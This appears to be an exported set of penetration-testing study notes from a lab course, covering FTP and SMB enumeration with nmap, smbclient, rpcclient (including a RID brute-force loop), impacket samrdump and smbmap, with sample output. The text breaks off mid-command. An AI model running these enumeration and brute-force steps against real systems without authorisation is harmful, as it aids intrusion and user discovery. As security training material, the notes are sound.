          <rich_text underline="single">Nmap FTP Scripts:</rich_text>
          <rich_text>
	
		Update nmap scripts:
			$ sudo nmap --script-updatedb
			
		</rich_text>
          <rich_text weight="heavy">Scripts are located at /usr/share/nmap/scripts</rich_text>
          <rich_text>
		
			$ find / -type f -name ftp* 2&gt;/dev/null | grep scripts
		
		</rich_text>
          <rich_text underline="single" weight="heavy">Nmap:</rich_text>
          <rich_text>
			$ sudo nmap -sV -p21 -sC -A 10.129.14.136
		
		</rich_text>
          <rich_text underline="single" weight="heavy">Nmap Script Trace: </rich_text>
          <rich_text>
			$ sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
			
			
</rich_text>
          <rich_text underline="single" weight="heavy">Service Interaction:</rich_text>
          <rich_text>

	$ ftp 10.129.14.136

	$ nc -nv 10.129.14.136 21
	
	$ telnet 10.129.14.136 21
	
</rich_text>
          <rich_text underline="single" weight="heavy">For TLS/SSL encryption we use openssl:</rich_text>
          <rich_text>
	
	$ openssl s_client -connect 10.129.14.136:21 -starttls ftp</rich_text>
          <table char_offset="273" justification="left" col_min="300" col_max="300" col_widths="0,0" is_light="1">
            <row>
              <cell>listen=NO</cell>
              <cell>Run from inetd or as a standalone daemon?</cell>
            </row>
            <row>
              <cell>listen_ipv6=YES</cell>
              <cell>Listen on IPv6 ?</cell>
            </row>
            <row>
              <cell>anonymous_enable=NO</cell>
              <cell>Enable Anonymous access?</cell>
            </row>
            <row>
              <cell>local_enable=YES</cell>
              <cell>Allow local users to login?</cell>
            </row>
            <row>
              <cell>dirmessage_enable=YES</cell>
              <cell>Display active directory messages when users go into certain directories?</cell>
            </row>
            <row>
              <cell>use_localtime=YES</cell>
              <cell>Use local time?</cell>
            </row>
            <row>
              <cell>xferlog_enable=YES</cell>
              <cell>Activate logging of uploads/downloads?</cell>
            </row>
            <row>
              <cell>connect_from_port_20=YES</cell>
              <cell>Connect from port 20?</cell>
            </row>
            <row>
              <cell>secure_chroot_dir=/var/run/vsftpd/empty</cell>
              <cell>Name of an empty directory</cell>
            </row>
            <row>
              <cell>pam_service_name=vsftpd</cell>
              <cell>This string is the name of the PAM service vsftpd will use.</cell>
            </row>
            <row>
              <cell>rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</cell>
              <cell>The last three options specify the location of the RSA certificate to use for SSL encrypted connections.</cell>
            </row>
            <row>
              <cell>rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</cell>
              <cell></cell>
            </row>
            <row>
              <cell>ssl_enable=NO</cell>
              <cell></cell>
            </row>
            <row>
              <cell>Setting</cell>
              <cell>Description</cell>
            </row>
          </table>
          <table char_offset="606" justification="left" col_min="300" col_max="300" col_widths="0,0">
            <row>
              <cell>anonymous_enable=YES</cell>
              <cell>Allowing anonymous login?</cell>
            </row>
            <row>
              <cell>anon_upload_enable=YES</cell>
              <cell>Allowing anonymous to upload files?</cell>
            </row>
            <row>
              <cell>anon_mkdir_write_enable=YES</cell>
              <cell>Allowing anonymous to create new directories?</cell>
            </row>
            <row>
              <cell>no_anon_password=YES</cell>
              <cell>Do not ask anonymous for password?</cell>
            </row>
            <row>
              <cell>anon_root=/home/username/ftp</cell>
              <cell>Directory for anonymous.</cell>
            </row>
            <row>
              <cell>write_enable=YES</cell>
              <cell>Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?</cell>
            </row>
            <row>
              <cell>Setting</cell>
              <cell>Description</cell>
            </row>
          </table>
        </node>
        <node name="SMB" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678165241" ts_lastsave="1678212539">
          <rich_text>
</rich_text>
          <rich_text underline="single" weight="heavy">Common Internet File System (CIFS) - Port 445

When we connect to older NetBIOS systems, samba usually connects over ports 137,138,139.</rich_text>
          <rich_text>


</rich_text>
          <rich_text underline="single" weight="heavy">There a several versions of SMB, including outdated versions that are still used in specific infrastructures:</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Default Configuration:</rich_text>
          <rich_text>

		</rich_text>
          <rich_text family="monospace" background="#000000000000">rottaj@htb[/htb]</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">cat</rich_text>
          <rich_text family="monospace" background="#000000000000"> /etc/samba/smb.conf </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">|</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">grep</rich_text>
          <rich_text family="monospace" background="#000000000000"> -v </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">"#\|\;"</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace">

</rich_text>
          <rich_text family="monospace" background="#000000000000">		[global]
		   workgroup = DEV.INFREIGHT.HTB
		   server string = DEVSMB
		   log file = /var/log/samba/log.%m
		   max log size = 1000
		   logging = file
		   panic action = /usr/share/samba/panic-action %d

		   server role = standalone server
		   obey pam restrictions = yes
		   unix password sync = yes

		   passwd program = /usr/bin/passwd %u
		   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

		   pam password change = yes
		   map to guest = bad user
		   usershare allow guests = yes

		[printers]
		   comment = All Printers
		   browseable = no
		   path = /var/spool/samba
		   printable = yes
		   guest ok = no
		   read only = yes
		   create mask = 0700

		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">[print</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">]</rich_text>
          <rich_text family="monospace" background="#000000000000">
		   comment = Printer Drivers
		   path = /var/lib/samba/printers
		   browseable = yes
		   read only = yes
		   guest ok = no</rich_text>
          <rich_text>
		
	</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Setting Information:</rich_text>
          <rich_text>
	
	</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Dangerous Settings</rich_text>
          <rich_text>

	</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


	</rich_text>
          <rich_text underline="single">When setting up Samba it is highly recommended to look at the man pages and configure it ourselves. The more familiar you become with Samba server and SMB, the easier it will be to find our way around the environment.</rich_text>
          <rich_text>
	

</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Restart Samba:</rich_text>
          <rich_text>
	</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">root@samba:~</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">#</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">sudo</rich_text>
          <rich_text family="monospace" background="#000000000000"> systemctl restart smbd</rich_text>
          <rich_text>
	

</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">SMBClient - Conecting to the Share:</rich_text>
          <rich_text>
	</rich_text>
          <rich_text underline="single">List shares:</rich_text>
          <rich_text>
		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000"> smbclient -N -L //10.129.14.128</rich_text>
          <rich_text> 
		
</rich_text>
          <rich_text background="#000000000000">		</rich_text>
          <rich_text family="monospace" background="#000000000000">        Sharename       Type      Comment
        ---------       ----      -------
</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">        print</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000">          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">        IPC</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000">            IPC       IPC Service </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">(</rich_text>
          <rich_text family="monospace" background="#000000000000">DEVSM</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">)</rich_text>
          <rich_text family="monospace" background="#000000000000">
		SMB1 disabled -- no workgroup available</rich_text>
          <rich_text>
	
	</rich_text>
          <rich_text underline="single">Connect to share:</rich_text>
          <rich_text>
		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000"> smbclient //10.129.14.128/notes

			Enter WORKGROUP\&lt;username&gt;'s password: 
			Anonymous login successful
			Try "help" to get a list of possible commands.


			smb: \&gt; help

			?              allinfo        altname        archive        backup         
			blocksize      cancel         case_sensitive cd             chmod          
			chown          close          del            deltree        dir            
			du             echo           exit           get            getfacl        
			geteas         hardlink       help           history        iosize         
			lcd            link           lock           lowercase      ls             
			l              mask           md             mget           mkdir          
			more           mput           newer          notify         open           
			posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
			posix_unlink   posix_whoami   print          prompt         put            
			pwd            q              queue          quit           readlink       
			rd             recurse        reget          rename         reput          
			rm             rmdir          showacls       setea          setmode        
			scopy          stat           symlink        tar            tarmode        
			timeout        translate      unlock         volume         vuid           
			wdel           logon          listconnect    showconnect    tcon           
			tdis           tid            utimes         logoff         ..             
			!            


			smb: \&gt; ls

			  .                                   D        0  Wed Sep 22 18:17:51 2021
			  ..                                  D        0  Wed Sep 22 12:03:59 2021
			  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021

						    30313412 blocks of size 1024. 16480084 blocks available</rich_text>
          <rich_text>
						


</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Execute local system commands with an exclamation mark: (!&lt;cmd&gt;)</rich_text>
          <rich_text style="italic">

	</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Download Files from SMB:</rich_text>
          <rich_text>

		</rich_text>
          <rich_text family="monospace" background="#000000000000">smb: \&gt; get prep-prod.txt 

		getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) 
		(average 8,7 KiloBytes/sec)


		smb: \&gt; !ls

		prep-prod.txt


		smb: \&gt; !cat prep-prod.txt

		[] check your code with the templates
		[] run code-assessment.py
		[] …	</rich_text>
          <rich_text>
		

</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Samba Status:</rich_text>
          <rich_text>

	</rich_text>
          <rich_text underline="single">This is important to see who has access to an internal network:</rich_text>
          <rich_text>
		-&gt; What users are using the service.
		-&gt; Possible Security Authentication Module (SAM) server.

	</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">root@samba:~</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">#</rich_text>
          <rich_text family="monospace" background="#000000000000"> smbstatus

	Samba version 4.11.6-Ubuntu
	PID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              
	----------------------------------------------------------------------------------------------------------------------------------------
	75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    

	Service      pid     Machine       Connected at                     Encryption   Signing     
	---------------------------------------------------------------------------------------------
	notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           

	No locked files</rich_text>
          <rich_text>
	

</rich_text>
          <rich_text style="italic" weight="heavy">Footprinting the Service:</rich_text>
          <rich_text>
	When footprinting SMB is it recommended to do manual enumeration. Scripts like NSE can take a long time.
		-&gt; As we can see belowm NSE doesn't give us a lot of information. Therefore we should resort to other tools that allow us to do manual enumeration.
		
	</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Nmap:</rich_text>
          <rich_text>
		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">sudo</rich_text>
          <rich_text family="monospace" background="#000000000000"> nmap </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">10.129</rich_text>
          <rich_text family="monospace" background="#000000000000">.14.128 -sV -sC -p139,445

		Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
		Nmap scan report for sharing.inlanefreight.htb (10.129.14.128)
		Host is up (0.00024s latency).

		PORT    STATE SERVICE     VERSION
		139/tcp open  netbios-ssn Samba smbd 4.6.2
		445/tcp open  netbios-ssn Samba smbd 4.6.2
		MAC Address: 00:00:00:00:00:00 (VMware)

		Host script results:
		|_nbstat: NetBIOS name: HTB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
		| smb2-security-mode: 
		|   2.02: 
		|_    Message signing enabled but not required
		| smb2-time: 
		|   date: 2021-09-19T13:16:04
		|_  start_date: N/A

		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds</rich_text>
          <rich_text>
		
	
	
	</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">RPCclient:</rich_text>
          <rich_text>
	
		</rich_text>
          <rich_text underline="single">Anonymous login:</rich_text>
          <rich_text>
		
</rich_text>
          <rich_text background="#000000000000">		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000"> rpcclient -U </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">""</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">10.129</rich_text>
          <rich_text family="monospace" background="#000000000000">.14.128

		Enter WORKGROUP\'s password:
		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text>
		
		
		RPCclient offers many different requests. Resort to the man pages for a complete list.		
		
		</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <rich_text style="italic">	</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">RPCclient Enumeration:</rich_text>
          <rich_text style="italic">
	</rich_text>
          <rich_text>
		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> srvinfo</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text family="monospace" background="#000000000000">
				DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
				platform_id     :       500
				os version      :       6.1
				server type     :       0x809a03
				
				
		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> enumdomains

		name:[DEVSMB] idx:[0x0]
		name:[Builtin] idx:[0x1]


	</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> querydominfo

		Domain:         DEVOPS
		Server:         DEVSMB
		Comment:        DEVSM
		Total Users:    2
		Total Groups:   0
		Total Aliases:  0
		Sequence No:    1632361158
		Force Logoff:   -1
		Domain Server State:    0x1
		Server Role:    ROLE_DOMAIN_PDC
		Unknown 3:      0x1


	</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> netshareenumall

		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">netname: print</rich_text>
          <rich_text family="monospace" background="#000000000000">$
				remark: Printer Drivers
				path:   C:\var\lib\samba\printers
				password:
		netname: home
				remark: INFREIGHT Samba
				path:   C:\home\
				password:
		netname: dev
				remark: DEVenv
				path:   C:\home\sambauser\dev\
				password:
		netname: notes
				remark: CheckIT
				path:   C:\mnt\notes\
				password:
		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">netname: IPC</rich_text>
          <rich_text family="monospace" background="#000000000000">$
				remark: IPC Service (DEVSM)
				path:   C:\tmp
				password:
				
				
	</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> netsharegetinfo notes

		netname: notes
				remark: CheckIT
				path:   C:\mnt\notes\
				password:
				type:   0x0
				perms:  0
				max_uses:       -1
				num_uses:       1
		revision: 1
		type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
		DACL
				ACL     Num ACEs:       1       revision:       2
				---
				ACE
				        type: ACCESS ALLOWED (0) flags: 0x00 
				        Specific bits: 0x1ff
				        Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
				        SID: S-1-1-0</rich_text>
          <rich_text>
				
				
				

	</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">RPCclient - User Enumeration:</rich_text>
          <rich_text>
	
	</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> enumdomusers</rich_text>
          <rich_text family="monospace">

</rich_text>
          <rich_text family="monospace" background="#000000000000">		user:[mrb3n] rid:[0x3e8]
		user:[cry0l1t3] rid:[0x3e9]


		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> queryuser 0x3e9

				User Name   :   cry0l1t3
				Full Name   :   cry0l1t3
				Home Drive  :   \\devsmb\cry0l1t3
				Dir Drive   :
				Profile Path:   \\devsmb\cry0l1t3\profile
				Logon Script:
				Description :
				Workstations:
				Comment     :
				Remote Dial :
				Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
				Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
				Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
				Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
				Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
				Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
				unknown_2[0..31]...
				user_rid :      0x3e9
				group_rid:      0x201
				acb_info :      0x00000014
				fields_present: 0x00ffffff
				logon_divs:     168
				bad_password_count:     0x00000000
				logon_count:    0x00000000
				padding1[0..7]...
				logon_hrs[0..21]...


		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> queryuser 0x3e8

				User Name   :   mrb3n
				Full Name   :
				Home Drive  :   \\devsmb\mrb3n
				Dir Drive   :
				Profile Path:   \\devsmb\mrb3n\profile
				Logon Script:
				Description :
				Workstations:
				Comment     :
				Remote Dial :
				Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
				Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
				Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
				Password last set Time   :      Mi, 22 Sep 2021 17:47:59 CEST
				Password can change Time :      Mi, 22 Sep 2021 17:47:59 CEST
				Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
				unknown_2[0..31]...
				user_rid :      0x3e8
				group_rid:      0x201
				acb_info :      0x00000010
				fields_present: 0x00ffffff
				logon_divs:     168
				bad_password_count:     0x00000000
				logon_count:    0x00000000
				padding1[0..7]...
				logon_hrs[0..21]...</rich_text>
          <rich_text>
				
				
				
	</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">RPCclient - Group Information</rich_text>
          <rich_text style="italic">:</rich_text>
          <rich_text>
	
</rich_text>
          <rich_text background="#000000000000">		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">rpcclient </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&gt;</rich_text>
          <rich_text family="monospace" background="#000000000000"> querygroup 0x201

		    Group Name:     None
		    Description:    Ordinary Users
		    Group Attribute:7
		    Num Members:2</rich_text>
          <rich_text>
		
		
	
	</rich_text>
          <rich_text underline="single" weight="heavy">It could happen that we have certain restrictions based on the user. The queryuser &lt;RID&gt; command is mostly allowed based on RID. We can use the rpcclient to bruteforce RIDs to get information.</rich_text>
          <rich_text>
	
	
	
	</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Brute Force User RIDs:</rich_text>
          <rich_text>
		
		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484">for</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">i</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484">in</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">$(</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">seq</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">500</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">1100</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">)</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">;</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484">do</rich_text>
          <rich_text family="monospace" background="#000000000000"> rpcclient -N -U </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">""</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">10.129</rich_text>
          <rich_text family="monospace" background="#000000000000">.14.128 -c </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">"queryuser 0x$(</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484">printf</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467"> '%x</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">\n</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">' $i)"</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">|</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">grep</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">"User Name\|user_rid\|group_rid"</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#5cb2ff">&amp;&amp;</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484">echo</rich_text>
          <rich_text family="monospace" background="#000000000000"> </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">""</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">;</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484">done</rich_text>
          <rich_text family="monospace" background="#000000000000">

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
		
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
		
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201</rich_text>
          <rich_text>
        
        
        
    
    </rich_text>
          <rich_text underline="single" style="italic" weight="heavy">Impacket - Samrdump.py</rich_text>
          <rich_text style="italic"> </rich_text>
          <rich_text>
    	</rich_text>
          <rich_text underline="single">Alternatively, we can use Impacket to brute force RIDs.</rich_text>
          <rich_text>
    
    		</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000"> samrdump.py </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">10.129</rich_text>
          <rich_text family="monospace" background="#000000000000">.14.128

				Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

				[*] Retrieving endpoint list from 10.129.14.128
				Found domain(s):
				 . DEVSMB
				 . Builtin
				[*] Looking up users in domain DEVSMB
				Found user: mrb3n, uid = 1000
				Found user: cry0l1t3, uid = 1001
				mrb3n (1000)/FullName: 
				mrb3n (1000)/UserComment: 
				mrb3n (1000)/PrimaryGroupId: 513
				mrb3n (1000)/BadPasswordCount: 0
				mrb3n (1000)/LogonCount: 0
				mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
				mrb3n (1000)/PasswordDoesNotExpire: False
				mrb3n (1000)/AccountIsDisabled: False
				mrb3n (1000)/ScriptPath: 
				cry0l1t3 (1001)/FullName: cry0l1t3
				cry0l1t3 (1001)/UserComment: 
				cry0l1t3 (1001)/PrimaryGroupId: 513
				cry0l1t3 (1001)/BadPasswordCount: 0
				cry0l1t3 (1001)/LogonCount: 0
				cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
				cry0l1t3 (1001)/PasswordDoesNotExpire: False
				cry0l1t3 (1001)/AccountIsDisabled: False
				cry0l1t3 (1001)/ScriptPath: 
				[*] Received 2 entries.</rich_text>
          <rich_text background="#000000000000">
	</rich_text>
          <rich_text>				
					
					

	</rich_text>
          <rich_text weight="heavy">The information we have obtained with rpcclient can be obtained using other tools. SMBMap &amp; CrackMapExec are also widely used.</rich_text>
          <rich_text>
	
		</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">SMBMap:</rich_text>
          <rich_text>
			</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000"> smbmap -H </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">10.129</rich_text>
          <rich_text family="monospace" background="#000000000000">.14.128

				[+] Finding open SMB ports....
				[+] User SMB session established on 10.129.14.128...
				[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
						Disk                                                    Permissions     Comment
						----                                                    -----------     -------
						</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">print</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000">                                                  NO ACCESS       Printer Drivers
						home                                                    NO ACCESS       INFREIGHT Samba
						dev                                                     NO ACCESS       DEVenv
						notes                                                   NO ACCESS       CheckIT
						</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">IPC</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000">                                                    NO ACCESS       IPC Service </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">(</rich_text>
          <rich_text family="monospace" background="#000000000000">DEVSM</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">)</rich_text>
          <rich_text>
						
						
	 	</rich_text>
          <rich_text underline="single" style="italic" weight="heavy">CrackMapExec:</rich_text>
          <rich_text>
</rich_text>
          <rich_text background="#000000000000">			</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000"> crackmapexec smb </rich_text>
